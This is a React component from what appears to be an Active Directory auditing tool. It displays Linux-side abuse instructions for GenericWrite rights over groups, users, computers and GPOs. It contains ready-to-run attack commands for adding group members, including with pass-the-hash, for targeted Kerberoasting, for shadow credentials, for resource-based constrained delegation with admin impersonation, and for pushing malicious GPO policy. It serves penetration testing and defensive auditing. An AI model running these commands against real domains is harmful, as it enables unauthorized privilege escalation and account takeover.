import React from 'react';
import PropTypes from 'prop-types';

const LinuxAbuse = ({ sourceName, sourceType, targetType }) => {
    switch (targetType) {
        case 'Group':
            return (
                <>
                    <p>
                        GenericWrite to a group allows you to directly modify
                        group membership of the group.
                    </p>

                    <p>
                        Use samba's net tool to add the user to the target group. The credentials can be supplied in cleartext
                        or prompted interactively if omitted from the command line:
                    </p>

                    <pre>
                        <code>
                            {
                                'net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'
                            }
                        </code>
                    </pre>

                    <p>
                        Pass-the-hash can also be done here with <a href='https://github.com/byt3bl33d3r/pth-toolkit'>pth-toolkit's net tool</a>.
                        If the LM hash is not known it must be replace with <code>ffffffffffffffffffffffffffffffff</code>.
                    </p>

                    <pre>
                        <code>
                            {
                                'pth-net rpc group addmem "TargetGroup" "TargetUser" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"'
                            }
                        </code>
                    </pre>

                    <p>
                        Finally, verify that the user was successfully added to the group:
                    </p>

                    <pre>
                        <code>
                            {
                                'net rpc group members "TargetGroup" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"'
                            }
                        </code>
                    </pre>
                </>
            );
        case 'User':
            return (
                <>
                    <h4> Targeted Kerberoast </h4>

                    <p>
                        A targeted kerberoast attack can be performed using{' '}
                        <a href='https://github.com/ShutdownRepo/targetedKerberoast'>targetedKerberoast.py</a>.
                    </p>

                    <pre>
                        <code>
                            {
                                "targetedKerberoast.py -v -d 'domain.local' -u 'controlledUser' -p 'ItsPassword'"
                            }
                        </code>
                    </pre>

                    <p>
                        The tool will automatically attempt a targetedKerberoast
                        attack, either on all users or against a specific one if
                        specified in the command line, and then obtain a crackable hash.
                        The cleanup is done automatically as well.
                    </p>

                    <p>
                        The recovered hash can be cracked offline using the tool
                        of your choice.
                    </p>

                    <h4> Shadow Credentials attack </h4>

                    <p>To abuse this privilege, use <a href='https://github.com/ShutdownRepo/pywhisker'>pyWhisker</a>.</p>

                    <pre>
                        <code>{'pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"'}</code>
                    </pre>

                    <p>
                        For other optional parameters, view the pyWhisker documentation.
                    </p>
                </>
            );
        case 'Computer':
            return (
                <>
                    <h4> Resource-Based Constrained Delegation </h4>

                    First, if an attacker does not control an account with an
                    SPN set, a new attacker-controlled computer account can be
                    added with Impacket's addcomputer.py example script:
                    <pre>
                        <code>
                            {
                                "addcomputer.py -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host $DomainController -domain-netbios $DOMAIN 'domain/user:password'"
                            }
                        </code>
                    </pre>
                    We now need to configure the target object so that the attacker-controlled
                    computer can delegate to it. Impacket's rbcd.py script can be used for that
                    purpose:
                    <pre>
                        <code>
                            {
                                "rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'TargetComputer' -action 'write' 'domain/user:password'"
                            }
                        </code>
                    </pre>
                    And finally we can get a service ticket for the service name (sname) we
                    want to "pretend" to be "admin" for. Impacket's getST.py example script
                    can be used for that purpose.
                    <pre>
                        <code>
                            {
                                "getST.py -spn 'cifs/targetcomputer.testlab.local' -impersonate 'admin' 'domain/attackersystem$:Summer2018!'"
                            }
                        </code>
                    </pre>
                    This ticket can then be used with Pass-the-Ticket, and could grant access
                    to the file system of the TARGETCOMPUTER.

                    <h4> Shadow Credentials attack </h4>

                    <p>To abuse this privilege, use <a href='https://github.com/ShutdownRepo/pywhisker'>pyWhisker</a>.</p>

                    <pre>
                        <code>{'pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"'}</code>
                    </pre>

                    <p>
                        For other optional parameters, view the pyWhisker documentation.
                    </p>
                </>
            );
        case 'GPO':
            return (
                <>
                    <p>
                        With GenericWrite over a GPO, you may make modifications
                        to that GPO which will then apply to the users and
                        computers affected by the GPO. Select the target object
                        you wish to push an evil policy down to, then use the
                        gpedit GUI to modify the GPO, using an evil policy that
                        allows item-level targeting, such as a new immediate
                        scheduled task. Then wait at least 2 hours for the group
                        policy client to pick up and execute the new evil
                        policy. See the references tab for a more detailed write
                        up on this abuse.
                    </p>

                    <p>
                        <a href="https://github.com/Hackndo/pyGPOAbuse">pyGPOAbuse.py</a> can be used for that purpose.
                    </p>
                    <p>
                        This edge can be a false positive in rare scenarios. If you have 
                        GenericWrite on the GPO with 'This object only' (no inheritance) 
                        and no other permissions in the ACL, it is not possible to add or 
                        modify settings of the GPO. The GPO's settings are stored in 
                        SYSVOL under a folder for the given GPO. Therefore, you need write 
                        access to child objects of this folder or create child objects 
                        permission. The security descriptor of the GPO is reflected on 
                        the folder, meaning permissions to write child items on the GPO
                        are required.
                    </p>
                </>
            );
    }
};

LinuxAbuse.propTypes = {
    sourceName: PropTypes.string,
    sourceType: PropTypes.string,
    targetType: PropTypes.string,
};

export default LinuxAbuse;
